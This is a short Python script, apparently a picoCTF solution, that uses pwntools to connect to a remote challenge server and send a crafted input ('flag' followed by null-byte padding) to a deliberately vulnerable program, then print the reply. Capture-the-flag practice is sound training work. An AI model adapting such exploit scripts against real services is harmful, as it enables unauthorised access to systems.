from pwn import *

# Connect to the vulnerable program
conn = remote('mimas.picoctf.net', 53961)

# Craft the input string with desired payload and padding
input_str = b"flag" + b"\x00" * 2

# Send the input to the program
conn.sendline(input_str)

# Receive and print the response
response = conn.recvline().decode().strip()
print("Response:", response)

# Close the connection
conn.close()